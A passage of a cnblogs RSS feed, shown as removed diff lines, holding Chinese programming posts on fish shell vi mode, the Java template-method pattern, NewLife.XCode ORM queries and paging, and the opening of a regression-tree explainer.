-&lt;pre&gt;
-$ fish_default_key_bindings
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://user-images.githubusercontent.com/3783096/56299503-bf90b100-6166-11e9-8c1f-d103a7be9af2.gif&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/3783096/56299503-bf90b100-6166-11e9-8c1f-d103a7be9af2.gif&quot; alt=&quot;命令行的 vi 模式演示&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p align=&quot;center&quot;&gt;命令行的 vi 模式演示&lt;/p&gt;
-&lt;p&gt;如果需要一直开始，可以配置文件中添加上述命令。&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;7&quot;&gt;
-&lt;pre&gt;
-$ vi &lt;span class=&quot;pl-k&quot;&gt;~&lt;/span&gt;/.config/fish/config.fish
-
-&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;#&lt;/span&gt; 其他代码&lt;/span&gt;
-fish_vi_key_bindings
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2&gt;选择合适的主题&lt;/h2&gt;
-&lt;p&gt;你可能需要一个可以在命令提示行中显示当前 vi 状态的主题。&lt;/p&gt;
-&lt;p&gt;推荐 fish 搭配 omf 使用 omf 中的&lt;a href=&quot;https://github.com/oh-my-fish/oh-my-fish/blob/master/docs/Themes.md&quot;&gt;主题&lt;/a&gt;。&lt;/p&gt;
-&lt;p&gt;fish 有默认的 vi 状态展示，和主题很不搭配。&lt;/p&gt;
-&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot; href=&quot;https://user-images.githubusercontent.com/3783096/56299552-dafbbc00-6166-11e9-8120-6d67820d85d8.png&quot;&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/3783096/56299552-dafbbc00-6166-11e9-8120-6d67820d85d8.png&quot; alt=&quot;fish 默认的 vi 状态展示&quot;/&gt;&lt;/a&gt;&lt;/p&gt;
-&lt;p align=&quot;center&quot;&gt;fish 默认的 vi 状态展示&lt;/p&gt;
-&lt;p&gt;需要手动去掉，配置文件中添加如下脚本：&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;7&quot;&gt;
-&lt;pre&gt;
-&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;fish_mode_prompt;&lt;/span&gt; end
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h2&gt;修正 fish 中的自动补全&lt;/h2&gt;
-&lt;p&gt;如果发现 vi 模式下， fish 的自动补全快捷键 &lt;kbd&gt;control&lt;/kbd&gt; + &lt;kbd&gt;f&lt;/kbd&gt; 不能用了，可在配置文件中添加如下脚本来修复这个快捷键：&lt;/p&gt;
-&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;8&quot;&gt;
-&lt;pre&gt;
-&lt;span class=&quot;pl-k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;fish_user_key_bindings&lt;/span&gt;
-    &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;pl-smi&quot;&gt;mode&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;in&lt;/span&gt; insert default visual
-        &lt;span class=&quot;pl-c1&quot;&gt;bind&lt;/span&gt; -M &lt;span class=&quot;pl-smi&quot;&gt;$mode&lt;/span&gt; &lt;span class=&quot;pl-cce&quot;&gt;\c&lt;/span&gt;f forward-char
-    end
-end
-&lt;/pre&gt;&lt;/div&gt;
-</description>
-<pubDate>Wed, 17 Apr 2019 15:21:00 +0000</pubDate>
-<dc:creator>刘哇勇</dc:creator>
-<og:description>命令行中修改已经输入的命令比较麻烦，如果你不知道一些快捷键的话，只能使用方向键一个一个字符地移动到目标位置进行修改，对于比较复杂且过长的命令来说，效率不高。 以下信息来自 bash 的 man 页面：</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/Wayou/p/cli_vi_mode.html</dc:identifier>
-</item>
-<item>
-<title>模板模式 - 浪潮之巅、</title>
-<link>http://www.cnblogs.com/JackSparrow-/p/10713978.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/JackSparrow-/p/10713978.html</guid>
-<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;模板模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-&lt;p&gt;    模板模式：一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，这种设计方式将一些步骤延迟到子类实现，但是子类却可以不改变一个算法的结构即可重定义该算法的某些特定步骤。&lt;/p&gt;
-&lt;p&gt;    模板方法为我们提供了一种代码复用的技巧，模板方法的抽象类可以定义具体方法、抽象方法和钩子。抽象方法由子类实现，钩子是一种方法，它可以不做任何事情，或者只做默认的事情，由子类决定是否覆盖这个方法。&lt;/p&gt;
-&lt;p&gt;   下面举个例子来阐述一下这个设计模式。&lt;/p&gt;
-&lt;p&gt;   比如说你和你对象去口渴了店里买饮料喝，一个要金桔柠檬，一个要珍珠奶茶。我们来想一下饮料的制作过程。&lt;/p&gt;
-&lt;p&gt;金桔柠檬：                                            珍珠奶茶：&lt;/p&gt;
-&lt;p&gt;1、把水倒入容器中                             1、把水倒进容器&lt;/p&gt;
-&lt;p&gt;2、加柠檬 、椰果等                             2、加调料（奶茶、珍珠等）&lt;/p&gt;
-&lt;p&gt;3、搅拌                                                3、搅拌&lt;/p&gt;
-&lt;p&gt;我们来用代码实现这些操作步骤：&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
- * 金桔柠檬
- &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Lemon {
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;倒水&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourWater(){};
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加柠檬&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourLemon(){};
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;搅拌&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; stir(){}
-}
-
-&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
- * 奶茶
- &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MilkTea {
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;倒水&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourWater(){};
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;加珍珠&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourPearl(){};
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;搅拌&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; stir(){}
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;    金桔柠檬和奶茶的制作有相同的地方，我们把这些共性进一步抽象,定义一个抽象类，将这些共性的东西，比如说倒水喝搅拌的动作，不希望子类修改的用final来修饰，而放调料由子类决定需要哪些调料，定义成抽象的方法，让子类必须去实现它。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MakeDrink {
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;倒水&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;  &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourWater(){ };
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;搅拌&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; stir(){};
-　　//加调料
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putSomething();
-
-}
-
-&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
- * 奶茶
- &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; MilkTea &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MakeDrink{
-
-    @Override
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putSomething() {
-        System.out.println(&lt;/span&gt;&quot;放珍珠&quot;&lt;span&gt;);
-    }
-}
-
-
-&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
- * 金桔柠檬
- &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Lemon &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MakeDrink{
-
-
-    @Override
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putSomething() {
-        System.out.println(&lt;/span&gt;&quot;放柠檬&quot;&lt;span&gt;);
-    }
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;这就是一个简单的模板模式的应用。&lt;/p&gt;
-&lt;p&gt;    好的，饮料制作好了，服务人员问你是打包还是现在就喝，你的对象说打包，但是你现在就想喝，那么可以在定义一个默认的方法，做一些默认的事情，比如说给你包装好，喝不喝随你，你可以重写这个方法，也可以选着不重写，这就是钩子。&lt;/p&gt;
-&lt;p&gt;我们在抽象类里面再加个打包的方法，Lemon类重写这个方法，而MilkTea采用父类默认的方法。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MakeDrink {
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;倒水&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt;  &lt;span&gt;void&lt;/span&gt;&lt;span&gt; pourWater(){ };
-    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;搅拌&lt;/span&gt;
-    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; stir(){};
-
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putSomething();
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; packageDrink(){
-        System.out.println(&lt;/span&gt;&quot;打包好了&quot;&lt;span&gt;);
-    }
-
-}
-
-&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
- * 金桔柠檬
- &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
-&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Lemon &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; MakeDrink{
-
-
-    @Override
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; putSomething() {
-        System.out.println(&lt;/span&gt;&quot;放柠檬&quot;&lt;span&gt;);
-    }
-
-    @Override
-    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; packageDrink(){
-        System.out.println(&lt;/span&gt;&quot;我现在就喝&quot;&lt;span&gt;);
-    }
-}&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;   我们平时代码开发经常用到这种模式，一些框架用到的也非常多，像Spring的JDBCTemplate。使用模板模式能够将代码的复用最大化，算法只存在于一个地方，容易修改。&lt;/p&gt;
-
-</description>
-<pubDate>Wed, 17 Apr 2019 15:14:00 +0000</pubDate>
-<dc:creator>浪潮之巅、</dc:creator>
-<og:description>模板模式 模板模式：一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，这种设计方式将一些步骤延迟到子类实现，但是子类却可以不改变一个算法的结构即可重定义该算法的某些特定步骤</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/JackSparrow-/p/10713978.html</dc:identifier>
-</item>
-<item>
-<title>[NewLife.XCode]高级查询（化繁为简、分页提升性能） - 大石头</title>
-<link>http://www.cnblogs.com/nnhy/p/xcode_search.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/nnhy/p/xcode_search.html</guid>
-<description>&lt;p&gt;NewLife.XCode是一个有10多年历史的开源数据中间件，支持nfx/netstandard，由新生命团队(2002~2019)开发完成并维护至今，以下简称XCode。&lt;/p&gt;
-&lt;p&gt;整个系列教程会大量结合示例代码和运行日志来进行深入分析，蕴含多年开发经验于其中，代表作有百亿级大数据实时计算项目。&lt;/p&gt;
-&lt;p&gt;开源地址：&lt;a href=&quot;https://github.com/NewLifeX/X&quot; target=&quot;_blank&quot;&gt;https://github.com/NewLifeX/X &lt;/a&gt;（求star, 754+）&lt;/p&gt;
-
-
-&lt;p&gt;前文&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_entity.html#_label6&quot; target=&quot;_blank&quot;&gt;《[NewLife.XCode]实体类详解》&lt;/a&gt;中有讲到扩展查询，XCode生成实体类代码时，在模型类有一个region叫“扩展查询”，一般是FindByAbc/FindAllByAbc的形式。&lt;/p&gt;
-&lt;p&gt;扩展查询以数据表索引为依据来生成：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;唯一索引（含主键）生成FindByAbc方法（如FindByName），返回单个对象；&lt;/li&gt;
-&lt;li&gt;非唯一索引生成FindAllByAbc方法（如FindAllByClassID），返回对象列表（非null）；&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417211648062-2079026478.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;如上图，可知Entity实体基类内部，查询方法分为单对象查询的Find和对象列表的查询FindAll。&lt;/p&gt;
-&lt;p&gt;实际上，Find最终调用FindAll方法查一行。&lt;/p&gt;
-
-&lt;p&gt;Find/FindAll有多个重载，最主要的地方都是构造where查询条件。&lt;/p&gt;
-&lt;p&gt;下划线_是每个实体类都有的内嵌类，它包含了每一个字段的Field引用，借助运算符重载，可以很方便的构造查询条件，例如上面的_.Name == name最终会生成 where Name='Stone'&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417213433311-191770165.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;因为是内嵌类，在实体类内部使用的时候非常方便。但要是想要实体类外部使用，就麻烦很多了，需要带上实体类类名。&lt;/p&gt;
-
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;原则：XCode是充血模型，不管多么简单的查询，建议都封装Find/FindAll/Search等方法供外部使用。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-
-&lt;p&gt; 仅靠一两个字段的简单查询，肯定无法满足各种业务要求，我们需要更强大的查询支持，特别是根据不同条件拼接不同语句。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417214203260-2133769925.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417214252107-529613287.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;上面是两个非常典型的业务查询。&lt;/p&gt;
-&lt;p&gt;这里请出了条件表达式WhereExpression，实际上它只有两个功能，&amp;amp;表示And，|表示Or，根据表达式级别支持括号运算。&lt;/p&gt;
-&lt;p&gt;exp&amp;amp;=xxx 是最常用的写法，右边一般是各种Field表达式。&lt;/p&gt;
-&lt;p&gt;上面第一个例子，生成的查询语句可能是 select * from Student where classid=?classid and name like '%?key%'&lt;/p&gt;
-&lt;p&gt;为什么说“可能”？因为classid为0，或者key为空时，并不会参与拼接查询语句。&lt;/p&gt;
-
-&lt;p&gt;第二个例子稍微复杂一些，首先对key进行精确查询，找到了就返回，若是没找到，则开启模糊查询。 &lt;/p&gt;
-&lt;p&gt;这里遇到了等于、包含、区间等判断操作，后面会详解所有支持的操作。&lt;/p&gt;
-
-&lt;p&gt;如非必要，建议保留select * 的查询方式，而不是指定列。 &lt;/p&gt;
-&lt;p&gt;&lt;span&gt;&lt;strong&gt;码农法则：数据库压力小于100qps时不要考虑指明select列来优化，大多数系统活不到需要优化的明天！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-
-&lt;p&gt;两个例子都出现了一个PageParameter参数page，这是分页参数，包含分页查询以及排序所需要的数据。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417222710264-1701063099.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;PageIndex和PageSize指定页序号和每页大小，这是内部建立分页查询的核心依据；&lt;/p&gt;
-&lt;p&gt;Sort 指定排序字段，Desc 指定是否降序（默认升序）；&lt;/p&gt;
-&lt;p&gt;RetrieveTotalCount 指定是否或者总记录数，若为true，则在查询记录集之前，先查询满足条件的总行数TotalCount，用于分页PageCount。此时等于执行两次数据库查询；&lt;/p&gt;
-&lt;p&gt;RetrieveState 指定是否获取统计 State，若为true，则在查询记录集之后，执行聚合查询，对数字型字段使用Sum聚合。此时最多可能执行3次数据库查询；&lt;/p&gt;
-
-&lt;p&gt;XCode要求数据查询必须考虑分页，没有分页的系统一般死在100万行以内。&lt;/p&gt;
-
-
-&lt;p&gt;内嵌类_引用的字段是Field，它继承自FieldItem。&lt;/p&gt;
-&lt;p&gt;Field/FieldItem全部功能：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Equal 等于，操作符==&lt;/li&gt;
-&lt;li&gt;NotEqual 不等于，操作符!=&lt;/li&gt;
-&lt;li&gt;大于操作符&amp;gt;，大于等于&amp;gt;=&lt;/li&gt;
-&lt;li&gt;小于操作符&amp;lt;，小于等于&amp;lt;=&lt;/li&gt;
-&lt;li&gt;StartsWith 字符串开始，like '{0}%'。（支持索引）&lt;/li&gt;
-&lt;li&gt;EndsWith 字符串结束，like '%{0}'&lt;/li&gt;
-&lt;li&gt;Contains 字符串包含，like '%{0}%'&lt;/li&gt;
-&lt;li&gt;In 集合包含，支持列表集合、字符串子查询和SelectBuilder子查询，集合只有一个元素时转为相等操作&lt;/li&gt;
-&lt;li&gt;NotIn 集合不包含，支持列表集合、字符串子查询和SelectBuilder子查询，集合只有一个元素时转为不相等操作&lt;/li&gt;
-&lt;li&gt;IsNull 是否空&lt;/li&gt;
-&lt;li&gt;NotIsNull 不是空&lt;/li&gt;
-&lt;li&gt;IsNullOrEmpty 字符串空或零长度&lt;/li&gt;
-&lt;li&gt;NotIsNullOrEmpty 字符串非空非零长度&lt;/li&gt;
-&lt;li&gt;IsTrue 是否True或者False/Null，参数决定两组之一&lt;/li&gt;
-&lt;li&gt;IsFalse 是否False或者True/Null，参数决定两组之一&lt;/li&gt;
-&lt;li&gt;Between 时间区间，大于等于开始，小于结束，如果开始结束都只有日期而没有时分秒，则结束加一天，如（2019-04-17,  2019-04-17）查 time&amp;gt;='2019-04-17' and time&amp;lt;2019-04-18'&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;排序字句/分组聚合&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Asc，升序&lt;/li&gt;
-&lt;li&gt;Desc，降序。order by name desc&lt;/li&gt;
-&lt;li&gt;GroupBy，分组。group by name&lt;/li&gt;
-&lt;li&gt;As，聚合别名&lt;/li&gt;
-&lt;li&gt;Count，计数&lt;/li&gt;
-&lt;li&gt;Sum，求和&lt;/li&gt;
-&lt;li&gt;Min，最小&lt;/li&gt;
-&lt;li&gt;Max，最大&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;span&gt;查询的本质是五参数版FindAll(where, order, selects, start, maxnums)，其它查询方式都由它转化而来！&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Entity实体基类封装了各种常用的查询方法：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417221417846-1979599099.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417221600918-915212593.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/19592/201904/19592-20190417221655588-1105882964.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;对于单表查询的XCode来说，五参数版FindAll很容易得到 &lt;span&gt;&lt;strong&gt;&lt;span&gt;select [selects] from [table] where [where] order by [order] limit [start], [maxnums] &lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;语句，根据这个理念，FindAll可以支持任意复杂查询！&lt;/p&gt;
-&lt;p&gt;最终查询语句，由SelectBuilder类承载。 &lt;/p&gt;
-
-
-&lt;p&gt;NewLife.XCode教程系列[2019版]&lt;/p&gt;
-&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_curd.html&quot; target=&quot;_blank&quot;&gt;增删改查入门&lt;/a&gt;。快速展现用法，代码配置连接字符串&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_model.html&quot; target=&quot;_blank&quot;&gt;数据模型文件&lt;/a&gt;。建立表格字段和索引，名字以及数据类型规范，推荐字段（时间，用户，IP）&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_entity.html&quot; target=&quot;_blank&quot;&gt;实体类详解&lt;/a&gt;。数据类业务类，泛型基类，接口&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_setting.html&quot; target=&quot;_blank&quot;&gt;功能设置&lt;/a&gt;。连接字符串，调试开关，SQL日志，慢日志，参数化，执行超时。代码与配置文件设置，连接字符串局部设置&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_negative.html&quot; target=&quot;_blank&quot;&gt;反向工程&lt;/a&gt;。自动建立数据库数据表&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_initdata.html&quot; target=&quot;_blank&quot;&gt;数据初始化&lt;/a&gt;。InitData写入初始化数据&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_curd_adv.html&quot; target=&quot;_blank&quot;&gt;高级增删改&lt;/a&gt;。重载拦截，自增字段，Valid验证，实体模型（时间，用户，IP）&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_dirty.html&quot; target=&quot;_blank&quot;&gt;脏数据&lt;/a&gt;。如何产生，怎么利用&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_additional.html&quot; target=&quot;_blank&quot;&gt;增量累加&lt;/a&gt;。高并发统计&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_transaction.html&quot; target=&quot;_blank&quot;&gt;事务处理&lt;/a&gt;。单表和多表，不同连接，多种写法&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_extend.html&quot; target=&quot;_blank&quot;&gt;扩展属性&lt;/a&gt;。多表关联，Map映射&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_search.html&quot; target=&quot;_blank&quot;&gt;高级查询&lt;/a&gt;。复杂条件，分页，自定义扩展FieldItem，查总记录数，查汇总统计&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_dbcache.html&quot; target=&quot;_blank&quot;&gt;数据层缓存&lt;/a&gt;。Sql缓存，更新机制&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_entitycache.html&quot; target=&quot;_blank&quot;&gt;实体缓存&lt;/a&gt;。全表整理缓存，更新机制&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_singlecache.html&quot; target=&quot;_blank&quot;&gt;对象缓存&lt;/a&gt;。字典缓存，适用用户等数据较多场景。&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_100billion.html&quot; target=&quot;_blank&quot;&gt;百亿级性能&lt;/a&gt;。字段精炼，索引完备，合理查询，充分利用缓存&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_factory.html&quot; target=&quot;_blank&quot;&gt;实体工厂&lt;/a&gt;。元数据，通用处理程序&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_membership.html&quot; target=&quot;_blank&quot;&gt;角色权限&lt;/a&gt;。Membership&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_import_export.html&quot; target=&quot;_blank&quot;&gt;导入导出&lt;/a&gt;。Xml，Json，二进制，网络或文件&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_division.html&quot; target=&quot;_blank&quot;&gt;分表分库&lt;/a&gt;。常见拆分逻辑&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_stat.html&quot; target=&quot;_blank&quot;&gt;高级统计&lt;/a&gt;。聚合统计，分组统计&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_batch.html&quot; target=&quot;_blank&quot;&gt;批量写入&lt;/a&gt;。批量插入，批量Upsert，异步保存&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_queue.html&quot; target=&quot;_blank&quot;&gt;实体队列&lt;/a&gt;。写入级缓存，提升性能。&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_backup.html&quot; target=&quot;_blank&quot;&gt;备份同步&lt;/a&gt;。备份数据，恢复数据，同步数据&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_service.html&quot; target=&quot;_blank&quot;&gt;数据服务&lt;/a&gt;。提供RPC接口服务，远程执行查询，例如SQLite网络版&lt;/li&gt;
-&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/nnhy/p/xcode_bigdata.html&quot; target=&quot;_blank&quot;&gt;大数据分析&lt;/a&gt;。ETL抽取，调度计算处理，结果持久化&lt;/li&gt;
-&lt;/ol&gt;
-</description>
-<pubDate>Wed, 17 Apr 2019 14:36:00 +0000</pubDate>
-<dc:creator>大石头</dc:creator>
-<og:description>码农法则：数据库压力小于100qps时不要考虑指明select列来优化，大多数系统活不到需要优化的明天！</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/nnhy/p/xcode_search.html</dc:identifier>
-</item>
-<item>
-<title>回归树（Regression Tree） - wuliytTaotao</title>
-<link>http://www.cnblogs.com/wuliytTaotao/p/10724118.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/wuliytTaotao/p/10724118.html</guid>
-<description>&lt;p&gt;说到决策树（Decision tree），我们很自然会想到用其做分类，每个叶子代表有限类别中的一个。但是对于决策树解决回归问题，一直是一知半解，很多时候都是一带而过。&lt;/p&gt;
-&lt;p&gt;对于一个回归问题，我们第一时间想到的可能就是线性回归（linear regression），当线性回归不好的时候，可能想着用 SVR（Support Vector Regression）试试。但回归树（regression tree）也很重要，现在 shallow learning 被 SVM 和树模型统治，随机森林、GBDT、xgboost、lightGBM 大行其道，所以知道什么是回归树很有必要。&lt;/p&gt;
